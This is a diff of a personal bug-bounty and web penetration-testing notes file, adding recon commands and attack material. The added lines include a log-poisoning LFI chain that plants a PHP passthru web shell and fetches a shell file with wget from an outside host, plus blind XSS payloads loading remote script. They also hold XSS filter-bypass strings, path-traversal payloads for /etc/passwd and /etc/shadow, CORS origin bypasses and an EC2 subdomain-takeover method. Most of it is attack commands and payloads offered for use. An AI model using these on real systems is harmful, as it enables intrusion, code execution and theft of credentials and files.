@@ -1,22 +1,10 @@
-URL encoding. It allows us to put any characters into a URL without breaking the URL    
-    example
-    http://localhost:8000/?name=%3Cimg%20src=%22https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg%22%3E
-    
-    extension
-    Use Wappalyzer to check CMS or Builtwith or Retire.js or Ghostery ,shodan, knoxss
-
-
 
 understand the scope
 if small, dont do subdomain analysis, move into appliction analysis 
 #check for sharing authentication
 complex issue    //login issues been overlooked 
 
-tools to check out
-container plugins
-paramsfinder
-fuff
-photon
+
 
  $ chmod +x (tool)
 how to use files everywhere
@@ -35,20 +23,16 @@ how to use files everywhere
   old bug resolved
 
 
-recon with bill  (summary)
+
 
 githubtesting049@gmail.com
 
 
 place all the target in burpdsite  
 
-  subfinder
 
 
 
-check for languages and framwork used tools -wapplyzer and also server running
-
-    
 
  whatweb -a 3 (url)
  ping -c 1 (ip)
@@ -98,6 +82,21 @@ subfinder
 subfinder -d url - active | tee -a subfinder.txt
 subfinder -d google.com -all > subdomain.txt
 
+Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
+subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
+
+cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
+
+# Download all js urls and merge together and finally grep on:
+wget --no-check-certificate -i js.txt
+cat file1.js file2.js file3.js file4.js file5.js > all_js.js
+cat all_js.js | grep -r -E # Similar to the grep above...
+           RUN
+nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
+
+
+
+
  sublistr
 sublist3r example.com -o output ... $ cat output foo.example.com bar.example.com
  python3 sublist3r.py tesla.com
@@ -115,8 +114,12 @@ amass enum [-active] [-ip] -d target
 amass enum -d tesla.com | grep target
 amass enum -d target.com -o /filepath/subdomains.txt
 
-     
-     
+amass enum [-active] [-ip] -d target.com
+amass enum -d target.com | grep target.com  # To just list subdomains
+
+
+
+
      BRUTEFORCE SUBDOMIAN
      KNOCKPY TESLA.COM
 
@@ -187,6 +190,25 @@ amass enum -d target.com -o /filepath/subdomains.txt
      
 
       Javascript Enumeration
+      
+      # Normal Install
+go install github.com/hakluke/hakrawler@latest
+
+# Single URL
+echo https://target.com | hakrawler
+
+# Multiple URLs
+cat urls.txt | hakrawler
+
+# Include subdomains
+echo https://target.com | hakrawler -subs
+
+# Get all subdomains of google, find the ones that respond to http(s), crawl them all
+echo target.com | haktrails subdomains | httpx | hakrawler
+
+  
+  
+  
   
 cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
  
@@ -204,9 +226,6 @@ $ subjs -i urls.txt
 
 content discovery/params discovery  for bug hunting
 
-check for  python3 SecretFinder.py
-
-
  waybackurls target.com | grep "\\.js"|uniq|sort
  waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
                                        $ cat hosts.txt | gau | subjs                     // no output   check later
@@ -221,7 +240,13 @@ keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequ
  
 
  WAYBACKURL FOR BUG HUNTING
-    waybackurl  (git the github usage)
+ # Only get all urls from wayback machine
+wayback_machine_downloader http://target.com -c 5 > all_urls.txt
+
+# Check status of urls and make new file
+cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
+
+    waybackurl  (check the github usage)
     echo "url" | waybackurl
     
 
@@ -249,21 +274,12 @@ grep "\.txt"
 ~ "\.config"     
 
       
-      AUTOMATION FOR REPLACING PARAMETERS WITH PAYLOADS
-      QSREPLACE (check github for more guidance)
+      AUTOMATION FOR REPLACING PARAMETERS WITH PAYLOADS      
+      QSREPLACE (check github for more guidance)              also check for xss_vibes 
       cat file.txt | qsreplace "<script>alert(1) </script>"  
       
       
-      FOOTPRINTING WEBSITES 
-      whatweb (url) -v a4
-      osint framwork.com
-     netcratf.com
-     securityheaders.com
-     Dnsdumster.com
-     whois.com
-     mxtoolbox.com
-     
-     emkel.c2       //// fakemails 
+    
      
      
      
@@ -272,7 +288,11 @@ grep "\.txt"
      dirb tesla.com (wordlist)
 
 
+# bruteforcing url and excluding status code (e.g. 302)
+gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b 302
 
+gobuster dns -d mysite.com -t 50 -w subdomains.txt
+gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
 gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
 gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/web-content/directory-list-2.3-medium.txt
 
@@ -280,8 +300,9 @@ fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.t
  fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt ml 200, 301
 
 
-gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
-gobuster dns -d mysite.com -t 50 -w subdomains.txt
+
+
+
 
 finding files
 gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x,html,css,.js
@@ -300,6 +321,11 @@ gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomain
      python3 sub404.py  -f
      
      subjack
+     
+     bbot
+    pipx install bbot
+     bbot -t evilcorp.com -f subdomain-enum
+     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
 
    
  
@@ -360,16 +386,25 @@ https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22
 
 
 
+              GOOGLE DORKS
+              
+              
 Broad domain search w/ negative search
 site:example.com -www -shop -share -ir -mfa
 
  site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
 
 
-google dorks
 
 PHP extension w/ parameters
 site:example.com ext:php inurl:?
+ intitle: index X of inurl: backup
+ inurl:index.php.bak
+ filetype:xls inurl:1 xls0
+ site:anu.edu inurl:admin
+ intitle:index of "apache/1.3.27 server at
+ inurl:ws_ftp.log
+ intitle:index of inurl:admin 
 
 Disclosed XSS and Open Redirects
 site:openbugbounty.org inurl:reports intext:"example.com"
@@ -545,6 +580,116 @@ Now you need to check if company has the page or not , if no then register as th
    ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
    
    TEASTE FOR BROWERS CACHE WEAKNESS , this is by loginin and also log out  of you appilcation and then click the browers back botton to verify if you could login
+   
+   changing the usid of the user and also changing the application name to admin could lead to privilage esccalation
+   
+   check for IDOR of the login page/ source page  by changing the upload-file.php to ../../../../etc/passwd
+   
+   session fixation ->  using the comparer tool in burp to show/  chcek  the  session cookie of an browers session cookie when not login and when login   
+  
+  testing for expose -session varaibles-> try to change application roles to admin , it manyatimes exposes the hidden fleid of an appliction    //change from user to admin
+  
+  when running an unathenticated testing of a web app, check for web app poinsoing in the post request  and check if the content type is returning index.html/text .html
+  
+  
+  
+  
+  tools for subdomain 
+  amass
+  findomain
+  subfinder
+  sublist3r
+  assetfinder
+  bbot
+  
+  for port scanning
+  naabu
+  masscan
+  nmap
+  skanuvaty 
+  
+  director bruteforce
+  gobuster
+  fuff
+  dirb
+  
+  xss bruteforce
+  qsreplace
+  xss-vibes
+  
+  sensitive discovery in js files
+  SecretFinder.py
+  photon
+  
+   
+  
+   TOOLS FOR PARAMters spidering of url
+   arjun
+   paramspider
+   katana 
+   hawkrawler
+   gosipder
+   
+   filtering out live domain
+   httpx
+   httprobe
+   
+   sorting out url
+   gf
+   
+  tools for  geting  way backurl
+  waybackurl
+  gau
+  photon
+  
+    tools for  SUBDOMAIN TAKEOVER
+     Hostilesubruteforce
+     ruby sub-brute.rb
+     sub404
+     python3 sub404.py  -f
+      subjack
+       https://github.com/sarveshkapre/subdomain_takeover
+       subzy
+      
+     tools for  asset discory
+     crt.sh
+     cenys
+     shodan
+      
+  
+    FOOTPRINTING WEBSITES 
+      whatweb (url) -v a4
+      osint framwork.com
+     netcratf.com
+     securityheaders.com
+     Dnsdumster.com
+     whois.com
+     mxtoolbox.com
+     emkel.c2       //// fakemails 
+     
+     visual recon 
+     gowitness
+     https screenshoot
+     
+  
+   
+   
+   TOOLS TO CHECK ON  
+   subdomain_takeover         https://github.com/sarveshkapre/subdomain_takeover
+   XSS-Automation-Tool        https://github/EmperialX/Xss-automation-Tools    
+   URL-hunter                 https://github/SecuritySphinx/Url-hunter
+   ParamAngler                https://spyx/ParamAngler  
+   pytractor                  https://Noll101/pytrator
+   w3af.org
+   X-Recon                    https://joshkar/X-recon
+   jsfinder                   https://kacakb/jsfinder
+   Lfi-space                  https://capture0x
+   klyda                      https://Xeonrx       dictionary spray
+ 
+   
+   
+   
+   
 
 
 
@@ -819,6 +964,18 @@ Base64 Encoding + Unicode Encoding:  and
 
 combination of all technique 
 
+BYPASSING XSS FILTERS
+
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string
+
+\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string
+
+\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings
+
+%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
+
 
 Blind XSS
 Use burpcollaborator or ngrok
@@ -832,7 +989,17 @@ Use burpcollaborator or ngrok
 7- Log Viewers
 8- Feedback Page
 9- Chat Applications
-10- Any app that requires user moderation
+10- Any app that requires user moderation          
+
+  stepss when hunting for bliind xss in an e-commerce website
+     when filling out forms allows sticks with the src tag andalso make alot of assumption
+     name :   '"://></script></script/src=http://url.com/      remember to change url parameter, shpould in case url is been filltered 
+     <input data = ""/><script/src=//"..."></script>
+      strick on the delivery not or any input field
+      
+     "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
+
+
 
             DOM XSS
 Tips
@@ -1009,8 +1176,41 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 
 
 
+     USING XSS-VIBES    check docs
+     first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
+     on xss-vibes directory
+     katana -u "url" -o katana.txt
+      python3 main.py -f katana.txt -o xss_vibes.txt
+       python3 main.py -f katana.txt -o --waf                  // to dectect if there is web application firwall
+      python3 main.py -f katana.txt -w cloudflare -t 5        //specify the firewall
+     
+     
+     
+     adding payload on xss-vibes
+     $ python3 added.py -p "payload"
+      $ python3 added.py -p "payload"  -w cloudflare
+      $ python3 added.py -f payload.txt -w  wordfence                adding a payload with filename and also speciflying the name 
+     
+     USING MY NUCLEI TEMPLET FOR XSS 
+     nuclei -l url.txt -t xss.yml                   this is on my desktop/tool
+     
+     
+   
+     
+     
+     
+     
+     
+     
+     
+     
+
+
 
   CORS  BYPASSING / MISCONFIGURED
+  ffuf
+  ffuf -w subdomains-top1million-5000.txt -u http://10.20.30.40 -H 'Origin: http://FUZZ.target.com' -mr "Access-Control-Allow-Origin" -ignore-body
+
   
   hunting 1 (single target)
   
@@ -1217,21 +1417,160 @@ fetch(targetURL, {
   .catch(error => {
     console.error('Error:', error);
   });
+  
+  CORS Bypass
+Origin:null
+Origin:attacker.com
+Origin:attacker.target.com
+Origin:attackertarget.com
+Origin:sub.attackertarget.com
+Origin:attacker.com and then change the method Get to post/Post to Get
+Origin:sub.attacker target.com
+Origin:sub.attacker%target.com
+Origin:attacker.com/target.com
+
+
+
+
+
+  
+    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
+    1) Verify the LFI vulnerability by grabbing the passwd, hosts, etc, files       /index.php?page=/etc/passwd
+   2) Verify that you have access to the access log by including it through LFI       /index.php?page=/var/log/apache2/access.log
+   3) Use netcat or something similar to send the mailicious request    
+      ncat 192.168.56.101 80
+    Then we need to enter the following
+
+   GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+    Host: (your_ip)
+    Connection: close
+    4) Verify code execution by testing some simple command like id, whoami, etc     	 /index.php?page=/var/log/apache2/access.log&cmd=id
+
+   5) Use either wget or write a upload form to the server to get the browser shell onto the server    	 &cmd=wget http://somedomain.com/shellfile.php
+  6) Visit the browser shell to verify success.    
+  
+  
+     //////////
+     
+     focus on spcific parameter like image=,file= , filename=, documement==test.pdf
+     use wapplazer to check what the application is running on 
+     you could goggle check the  ---      site:url inurl:?filename=ext:aspx  and try to travess on path using the web.config   NOTE: ext:aspx  this depends on what the application is running  
+     always use the burpsuite to check for lfi
+       check for download section
+      check for file extension and then assum if the file is ending with file .php or .jpeg    // check  for     ..//index.php  and  ../index.jpeg and so on
+      ffuf -u "https://www.harshithexams.co.in/download.php?filename=../FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac           this is example
+  
+    
+    ///////////// RFI
+    check if you could use the login page to redirect users to an external URL that is external to the application in burp
+    example, in the GET request of the page, change it to yours external url
+    GET/smartkelvin/index.php?page=(yoururl)/page http/1.1
+    
+    /etc/shadow /// also use this too
+    
+    
+    TRAVERSAL SEQUENCES STRIPPED NON-RECURSIVELY
+    http://example.com/index.php?page=../../../etc/passwd
+    http://example.com/index.php?page=....//....//....//etc/passwd
+    http://example.com/index.php?page=....\/....\/....\/etc/passwd
+    http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+    
+    
+    http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
+    http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
+http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
+
+#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
+
+http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
+http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
+
+    FILTER BYPASS TRICK 
+    http://example.com/index.php?page=....//....//etc/passwd
+     http://example.com/index.php?page=..///////..////..//////etc/passwd
+     http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+    Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
+    http://example.com/index.php?page=PhP://filter
+    
+    
+    
+    Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI)
+    ?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
+
+        
+          BUSINESS LOGIN
+      
+      
+      
+      
+      
+      
+
+
+
+
 
   
   
-
-
-
-
+  
+  
+  
   
   
   
     
 
 
+   
+
+      IDOR
+Here's a simple approach to spot these vulnerabilities: misconfigured object  IN  Salesforce site?
+
+1️⃣ Install this amazing tool - 🔧 https://github.com/moniik/poc_salesforce_lightning
+2️⃣ Run python3 http://exploit.py -u https://{{target(.)com -d -s
+3️⃣ The tool will automatically scan for object misconfigurations and display objects with result counts. 
+4️⃣ Found any interesting objects with a result count >0? 🧐 
+5️⃣ You can explore further in this nice article - 📖 https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae to exploit the misconfiguration.
 
 
+      EC2 subdomian takeover 
+🚀 Opportunity Alert! 🛠️ Automating EC2 Subdomain Takeovers can be a goldmine, and less than 10 people are on it! The likelihood of duplicates is low, and bounties range from $500 to $3000. 
+
+Here's a brief methodology:
+(1) Identify potential dangling EC2 targets (Using nuclei template)
+(2) Spin up multiple free-tier EC2 Instances in same regions where dangling targets were found e.g. us-east-1, etc.
+(3) Run the start-stop script to change IP addresses and retain matching EC2 Instance
+(4) Host your PoC on the hijacked EC2 Instance
+(5) Enjoy a nice 'High' severity bounty
+(6) Rinse and Repeat! 🔄 #BugBounty #EC2Takeovers, #cybersecurity,#HackerOne,#Bugcrowd
+
+Check out this article for details: https://web.archive.org/web/20220331095516/blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state
+Here's the link to the nuclei template - https://github.com/projectdiscovery/nuclei-templates/raw/2ff27f5a024d7a8179b241931d00adc4d5d3fa93/dns/ec2-detection.yaml
+Here's the link to the start-stop script - https://github.com/adilnbabras/EC2-Start-Stop
 
 
 
@@ -1324,39 +1663,9 @@ ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -b "PHPSESSID:"7aaaa6d88edcf7
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u  (url/ IP) -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body
 
 
-DIRECTORY TRAVEREY
-....\/
-.....
-  ##check for URL encodeing
-  %2527 becomes %27        this is also used in sql injection
-  
- 
- 
- 
- 
- 
- 
- 
-
 
 #https://github.com/codingo/VHostScan
 VHostScan -t example.com
-
-
-
-
-
-BYPASSING XSS FILTERS
-
-&#60;script&#62;alert(1)&#60;/script&#62;
-
-%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string
-
-\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string
-
-\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings
-
-%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
 
 
 
